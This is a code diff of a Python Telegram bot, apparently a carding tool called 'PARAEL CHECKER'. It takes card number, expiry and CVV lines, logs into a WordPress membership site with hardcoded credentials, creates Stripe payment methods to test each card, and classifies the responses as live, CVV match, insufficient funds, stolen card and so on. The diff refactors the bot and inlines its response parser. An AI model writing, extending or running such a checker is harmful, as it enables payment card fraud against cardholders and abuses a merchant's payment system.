@@ -1,23 +1,22 @@
-import base64
-import httpx
-import random
+import os
+import re
 import time
 import json
-import uuid
-import os
 import asyncio
-from defs import *  # Pastikan charge_resp ada dan berfungsi
-import re
 from html import unescape
+
+import httpx
 from telegram import Update
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
-    ContextTypes,
     MessageHandler,
     filters,
+    ContextTypes,
 )
 
+# ----------------------------------------
+# Fungsi bantu ekstrak substring
 def gets(s: str, start: str, end: str) -> str | None:
     try:
         start_index = s.index(start) + len(start)
@@ -26,6 +25,8 @@ def gets(s: str, start: str, end: str) -> str | None:
     except ValueError:
         return None
 
+# ----------------------------------------
+# Fungsi utama yang membuat payment method di stripe
 async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
     try:
         cc, mes, ano, cvv = fullz.split("|")
@@ -65,8 +66,8 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         data_login = {
             'learndash-login-form': login_token,
             'pmpro_login_form_used': '1',
-            'log': 'senryph@gmail.com',   # Ganti sesuai login yang sesuai
-            'pwd': 'Senryph',               # Ganti password yang sesuai
+            'log': 'senryph@gmail.com',   # Ganti dengan akun login yang sesuai
+            'pwd': 'Senryph',               # Ganti password akun login
             'wp-submit': 'Log In',
             'redirect_to': '',
         }
@@ -85,7 +86,6 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         if not nonce:
             return "Failed to get add_card_nonce"
 
-        # Stripe create payment method
         headers_stripe = {
             'accept': 'application/json',
             'accept-language': 'en-US,en;q=0.9',
@@ -164,11 +164,127 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
     except Exception as e:
         return f"Exception: {str(e)}"
 
+# ----------------------------------------
+# Fungsi dari file defs.py yang kamu berikan
+async def charge_resp(result):
+    try:
+        if (
+            '{"status":"SUCCESS",' in result or
+            '"status":"success"' in result
+        ):
+            response = "Payment method successfully added ✅"
+        elif "Thank you for your donation" in result:
+            response = "Payment successful! 🎉"
+        elif "insufficient funds" in result or "card has insufficient funds." in result:
+            response = "INSUFFICIENT FUNDS ✅"
+        elif "Your card has insufficient funds." in result:
+            response = "INSUFFICIENT FUNDS ✅"
+        elif (
+            "incorrect_cvc" in result
+            or "security code is incorrect." in result
+            or "Your card's security code is incorrect." in result
+        ):
+            response = "CVV INCORRECT ❎"
+        elif "transaction_not_allowed" in result:
+            response = "TRANSACTION NOT ALLOWED ❎"
+        elif '"cvc_check": "pass"' in result:
+            response = "CVV MATCH ✅"
+        elif "requires_action" in result:
+            response = "VERIFICATION 🚫"
+        elif (
+            "three_d_secure_redirect" in result
+            or "card_error_authentication_required" in result
+            or "wcpay-confirm-pi:" in result
+        ):
+            response = "3DS Required ❎"
+        elif "stripe_3ds2_fingerprint" in result:
+            response = "3DS Required ❎"
+        elif "Your card does not support this type of purchase." in result:
+            response = "CARD DOESN'T SUPPORT THIS PURCHASE ❎"
+        elif (
+            "generic_decline" in result
+            or "You have exceeded the maximum number of declines on this card in the last 24 hour period."
+            in result
+            or "card_decline_rate_limit_exceeded" in result
+            or "This transaction cannot be processed." in result
+            or '"status":400,' in result
+        ):
+            response = "GENERIC DECLINED ❌"
+        elif "do not honor" in result:
+            response = "DO NOT HONOR ❌"
+        elif "Suspicious activity detected. Try again in a few minutes." in result:
+            response = "TRY AGAIN IN A FEW MINUTES ❌"
+        elif "fraudulent" in result:
+            response = "FRAUDULENT ❌ "
+        elif "setup_intent_authentication_failure" in result: 
+            response = "SETUP_INTENT_AUTHENTICATION_FAILURE ❌"
+        elif "invalid cvc" in result:
+            response = "INVALID CVV ❌"
+        elif "stolen card" in result:
+            response = "STOLEN CARD ❌"
+        elif "lost_card" in result:
+            response = "LOST CARD ❌"
+        elif "pickup_card" in result:
+            response = "PICKUP CARD ❌"
+        elif "incorrect_number" in result:
+            response = "INCORRECT CARD NUMBER ❌"
+        elif "Your card has expired." in result or "expired_card" in result: 
+            response = "EXPIRED CARD ❌"
+        elif "intent_confirmation_challenge" in result: 
+            response = "CAPTCHA ❌"
+        elif "Your card number is incorrect." in result: 
+            response = "INCORRECT CARD NUMBER ❌"
+        elif ( 
+            "Your card's expiration year is invalid." in result 
+            or "Your card's expiration year is invalid." in result
+        ):
+            response = "EXPIRATION YEAR INVALID ❌"
+        elif (
+            "Your card's expiration month is invalid." in result 
+            or "invalid_expiry_month" in result
+        ):
+            response = "EXPIRATION MONTH INVALID ❌"
+        elif "card is not supported." in result:
+            response = "CARD NOT SUPPORTED ❌"
+        elif "invalid account" in result: 
+            response = "DEAD CARD ❌"
+        elif (
+            "Invalid API Key provided" in result 
+            or "testmode_charges_only" in result
+            or "api_key_expired" in result
+            or "Your account cannot currently make live charges." in result
+        ):
+            response = "stripe error contact support@stripe.com for more details ❌"
+        elif "Your card was declined." in result or "card was declined" in result:
+            response = "CARD DECLINED ❌"
+        elif "card number is incorrect." in result:
+            response = "CARD NUMBER INCORRECT ❌"
+        elif "Sorry, we are unable to process your payment at this time. Please retry later." in result:
+            response = "Sorry, we are unable to process your payment at this time. Please retry later ⏳"
+        elif "card number is incomplete." in result:
+            response = "CARD NUMBER INCOMPLETE ❌"
+        elif "The order total is too high for this payment method" in result:
+            response = "ORDER TO HIGH FOR THIS CARD ❌"
+        elif "The order total is too low for this payment method" in result:
+            response = "ORDER TO LOW FOR THIS CARD ❌"
+        elif "Please Update Bearer Token" in result:
+            response = "Token Expired Admin Has Been Notified ❌"
+        else:
+            response = result + "❌"
+            with open("result_logs.txt", "a", encoding="utf-8") as f:
+                f.write(f"{result}\n")
+
+        return response
+    except Exception as e:
+        return f"{str(e)} ❌"
+
+# ----------------------------------------
+# Fungsi multi_checking yang menggabungkan semuanya
 async def multi_checking(fullz: str) -> str:
     start = time.time()
     async with httpx.AsyncClient(timeout=40) as session:
         result = await create_payment_method(fullz, session)
-        response = await charge_resp(result)  # Pastikan fungsi ini kompatibel
+        response = await charge_resp(result)
 
     elapsed = round(time.time() - start, 2)
 
@@ -200,14 +316,17 @@ async def multi_checking(fullz: str) -> str:
 
     return output
 
+# ----------------------------------------
 # Telegram bot handlers
 
-TELEGRAM_BOT_TOKEN = os.getenv("TOKEN")  # Ganti token asli kamu ya
+TELEGRAM_BOT_TOKEN = os.getenv("TOKEN")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text(
         "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
+        "Please send your card info in the format:\n"
         "CC|MM|YYYY|CVV\n"
+        "Example:\n"
         "4693080257546198|12|29|590\n"
         "4693080257546198|12|2029|590"
     )
@@ -223,7 +342,7 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
             parts = line.split("|")
             if len(parts) != 4:
                 await update.message.reply_text(
-                    f"WRONG FORMAT:\n<code>{line}</code>\nGunakan format CC|MM|YYYY|CVV",
+                    f"WRONG FORMAT:\n<code>{line}</code>\nUse format: CC|MM|YYYY|CVV",
                     parse_mode='HTML'
                 )
                 continue
@@ -234,7 +353,7 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
             cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"
 
-            # Optional sleep jika mau beri delay (hapus jika mau cek lebih cepat)
+            # Optional sleep if you want to add delay (remove if you want faster checks)
             await asyncio.sleep(3)
 
             result = await multi_checking(cc_formatted)
@@ -250,7 +369,7 @@ def main() -> None:
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_cc_message))
 
-    print("PARAEL CHECKER...")
+    print("PARAEL CHECKER BOT RUNNING...")
     application.run_polling()
 
 if __name__ == "__main__":
